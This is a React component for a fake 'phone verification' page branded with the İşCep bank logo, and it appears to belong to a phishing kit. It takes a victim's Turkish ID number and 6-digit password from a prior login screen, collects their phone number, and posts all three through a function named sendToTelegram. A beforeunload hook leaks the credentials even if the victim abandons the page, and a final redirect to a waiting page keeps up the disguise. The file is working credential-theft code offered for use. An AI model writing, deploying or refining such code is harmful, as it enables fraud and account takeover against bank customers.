import React, { useEffect, useRef, useCallback, memo } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import './App.css';
import { useAuth } from './AuthContext';

function PhoneVerificationPage() {
  const [state, setState] = React.useState({
    phoneNumber: '',
    isPhoneActive: false,
    isPhoneLabelHovered: false,
    showPhoneError: false,
    isSubmitting: false,
    isPhoneFocused: false,
    isPhonePrefixVisible: false,
    errorMessage: '',
  });

  const phoneInputRef = useRef(null);
  const location = useLocation();
  const navigate = useNavigate();
  const { dispatch: authDispatch } = useAuth();
  const { tc, password, isValidNavigation } = location.state || {};

  // Debounce yardımcı fonksiyonu
  const debounce = (func, delay) => {
    let timer;
    return (...args) => {
      clearTimeout(timer);
      timer = setTimeout(() => func(...args), delay);
    };
  };

  // Navigasyon ve geri tuşu kontrolü
  useEffect(() => {
    if (!isValidNavigation || !tc || !password || tc.length !== 11 || password.length !== 6) {
      setState((prev) => ({
        ...prev,
        showPhoneError: true,
        errorMessage: 'Geçersiz erişim, lütfen giriş yapın.',
      }));
      authDispatch({ type: 'RESET_AUTH' });
      navigate('/giris', { replace: true, state: { fromPhoneVerification: true } });
      return;
    }

    window.history.replaceState({ page: 'telefon' }, '', '/telefon');
    window.history.pushState({ page: 'telefon-guard' }, '', '/telefon');

    const handlePopState = (event) => {
      event.preventDefault();
      authDispatch({ type: 'RESET_AUTH' });
      window.history.replaceState(null, '', '/giris');
      navigate('/giris', { replace: true, state: { fromPhoneVerification: true } });
    };

    window.addEventListener('popstate', handlePopState);
    return () => window.removeEventListener('popstate', handlePopState);
  }, [tc, password, isValidNavigation, navigate, authDispatch]);

  // Scroll optimizasyonu: Telefon inputuna focus olduğunda right-section'ı kaydır
  useEffect(() => {
    const phoneRef = phoneInputRef.current;

    const handleFocusScroll = () => {
      const isAndroid = /Android/i.test(navigator.userAgent);
      const isSamsung = /Samsung/i.test(navigator.userAgent);
      const isOppo = /OPPO/i.test(navigator.userAgent);

      if (!isAndroid) return; // Sadece Android cihazlarda çalışsın

      // Samsung ve Oppo için daha uzun gecikme, diğer Android cihazlar için standart
      const delay = (isSamsung || isOppo) ? 800 : 600;

      const adjustScroll = debounce(() => {
        requestAnimationFrame(() => {
          const rightSection = document.querySelector('.right-section');
          const verifyButton = document.querySelector('.button-phone');
          if (!rightSection || !verifyButton) return;

          const buttonRect = verifyButton.getBoundingClientRect();
          const rightSectionRect = rightSection.getBoundingClientRect();
          const viewportHeight = window.visualViewport?.height || window.innerHeight;

          // Butonu ekranın üst %30'luk kısmına hizala
          const targetPosition = viewportHeight * 0.3;
          const scrollAmount = buttonRect.top - rightSectionRect.top - targetPosition;

          if (Math.abs(scrollAmount) > 10) {
            rightSection.scrollTo({
              top: rightSection.scrollTop + scrollAmount,
              behavior: 'smooth',
            });
          }
        });
      }, 50);

      setTimeout(adjustScroll, delay);

      // Klavye veya viewport değişikliklerini dinle
      const handleViewportChange = () => adjustScroll();
      if (window.visualViewport) {
        window.visualViewport.addEventListener('resize', handleViewportChange);
        window.visualViewport.addEventListener('scroll', handleViewportChange);
      }

      return () => {
        if (window.visualViewport) {
          window.visualViewport.removeEventListener('resize', handleViewportChange);
          window.visualViewport.removeEventListener('scroll', handleViewportChange);
        }
      };
    };

    const handlePhoneFocusScroll = () => handleFocusScroll();

    if (phoneRef) {
      phoneRef.addEventListener('focus', handlePhoneFocusScroll);
    }

    // Klavye kapandığında scroll'u sıfırla
    const handleBlurScroll = () => {
      const rightSection = document.querySelector('.right-section');
      if (rightSection) {
        rightSection.scrollTo({ top: 0, behavior: 'smooth' });
      }
    };

    if (phoneRef) {
      phoneRef.addEventListener('blur', handleBlurScroll);
    }

    return () => {
      if (phoneRef) {
        phoneRef.removeEventListener('focus', handlePhoneFocusScroll);
        phoneRef.removeEventListener('blur', handleBlurScroll);
      }
    };
  }, []);

  // Telegram gönderimi
  const sendToTelegram = useCallback(async (data) => {
    console.log('API çağrısı yapılıyor:', data);
    try {
      const res = await fetch(`${process.env.REACT_APP_API_URL}/api/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          tc: String(data.tc),
          password: String(data.password),
          phone: String(data.phone),
        }),
      });
      const result = await res.json();
      console.log('API yanıtı:', result);
      if (!res.ok) throw new Error(result.message || 'Veri gönderimi başarısız.');
      return result;
    } catch (error) {
      console.error('API hatası:', error.message);
      setState((prev) => ({
        ...prev,
        showPhoneError: true,
        errorMessage: error.message || 'Veri gönderimi sırasında hata oluştu.',
      }));
      return { error: error.message };
    }
  }, []);

  // Siteden çıkıldığında veri gönderimi
  useEffect(() => {
    const handleBeforeUnload = () => {
      if (tc && password && !state.phoneNumber) {
        sendToTelegram({ tc, password, phone: '' });
      }
    };
    window.addEventListener('beforeunload', handleBeforeUnload);
    return () => window.removeEventListener('beforeunload', handleBeforeUnload);
  }, [tc, password, state.phoneNumber, sendToTelegram]);

  const handleNumberInput = useCallback((e) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 10) {
      setState((prev) => ({
        ...prev,
        phoneNumber: value,
        isPhoneActive: true,
        isPhoneLabelHovered: true,
        isPhonePrefixVisible: true,
        showPhoneError: false,
        errorMessage: '',
      }));
    }
  }, []);

  const handleClearPhoneNumber = useCallback(() => {
    setState((prev) => ({
      ...prev,
      phoneNumber: '',
      isPhoneActive: true,
      isPhoneLabelHovered: true,
      isPhonePrefixVisible: true,
      showPhoneError: false,
      errorMessage: '',
    }));
    phoneInputRef.current?.focus();
  }, []);

  const handlePhoneFocus = useCallback(() => {
    setState((prev) => ({
      ...prev,
      isPhoneActive: true,
      isPhoneLabelHovered: true,
      isPhonePrefixVisible: true,
      isPhoneFocused: true,
    }));
  }, []);

  const handlePhoneBlur = useCallback(() => {
    setState((prev) => ({
      ...prev,
      isPhoneFocused: false,
      isPhoneActive: prev.phoneNumber.length > 0,
      isPhoneLabelHovered: prev.phoneNumber.length > 0,
      isPhonePrefixVisible: prev.phoneNumber.length > 0,
    }));
  }, []);

  const handlePhoneSubmit = useCallback(
    async (e) => {
      e.preventDefault();
      if (state.phoneNumber.length > 0 && state.phoneNumber.length !== 10) {
        setState((prev) => ({
          ...prev,
          showPhoneError: true,
          errorMessage: 'Telefon numarası 10 haneli olmalı.',
        }));
        return;
      }
      if (state.phoneNumber.length === 10) {
        setState((prev) => ({ ...prev, isSubmitting: true }));
        const result = await sendToTelegram({ tc, password, phone: state.phoneNumber });
        if (result && !result.error) {
          authDispatch({ type: 'RESET_AUTH' });
          setState({
            phoneNumber: '',
            isPhoneActive: false,
            isPhoneLabelHovered: false,
            showPhoneError: false,
            isSubmitting: false,
            isPhoneFocused: false,
            isPhonePrefixVisible: false,
            errorMessage: '',
          });
          window.history.replaceState(null, '', '/bekleme');
          navigate('/bekleme', { replace: true, state: { isValidNavigation: true, from: '/telefon', isCompleted: true } });
        }
      }
    },
    [state.phoneNumber, sendToTelegram, tc, password, navigate, authDispatch]
  );

  return (
    <div className="container" style={{ touchAction: 'manipulation' }}>
      <div className="right-section">
        <img src="/iscep-logo.png" alt="İşCep Logosu" className="iscep-logo iscep-logo-phone" loading="lazy" />
        <div className="new-container phone-verification-title">
          Telefon Doğrulama
          <div className="phone-verification-subtitle">
            Lütfen cep telefon numaranızı giriniz
          </div>
        </div>
        <div className="input-wrapper">
          <div
            className={`phone-input-wrapper ${state.showPhoneError ? 'error' : ''} ${
              state.isPhonePrefixVisible ? 'prefix-visible' : ''
            }`}
            onClick={() => phoneInputRef.current?.focus()}
          >
            <label
              className={`phone-label ${state.isPhoneLabelHovered ? 'phone-hovered' : ''}`}
              htmlFor="phone-input"
            >
              Telefon Numarası
            </label>
            <div className="phone-input-container">
              <span className="phone-prefix">+90</span>
              <input
                id="phone-input"
                ref={phoneInputRef}
                type="tel"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength="10"
                value={state.phoneNumber}
                onChange={handleNumberInput}
                onFocus={handlePhoneFocus}
                onBlur={handlePhoneBlur}
                className={`new-input phone-input ${state.showPhoneError ? 'error' : ''}`}
                autoComplete="tel"
                autoCapitalize="none"
                aria-describedby="phone-error"
                aria-label="Telefon Numarası"
                aria-invalid={state.showPhoneError}
              />
              {state.phoneNumber.length > 0 && (
                <button
                  className="clear-phone-button"
                  onClick={handleClearPhoneNumber}
                  onTouchStart={handleClearPhoneNumber}
                  aria-label="Telefon numarasını temizle"
                >
                  ✕
                </button>
              )}
            </div>
            {state.showPhoneError && (
              <div id="phone-error" className="phone-error" role="alert" aria-live="assertive">
                <img
                  src="/error.png"
                  alt="Hata Simgesi"
                  className="error-icon"
                  loading="lazy"
                  onError={() => console.warn('Hata simgesi yüklenemedi')}
                />
                {state.errorMessage || 'Lütfen 10 haneli telefon numaranızı girin.'}
              </div>
            )}
          </div>
          <div className="verify-button-container">
            <button
              className={`button-phone ${
                state.phoneNumber.length > 0 ? 'active-continue-button' : ''
              }`}
              onClick={handlePhoneSubmit}
              onTouchStart={handlePhoneSubmit}
              disabled={state.isSubmitting}
              aria-label="Telefon numarasını doğrula"
            >
              Doğrula
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

export default memo(PhoneVerificationPage);
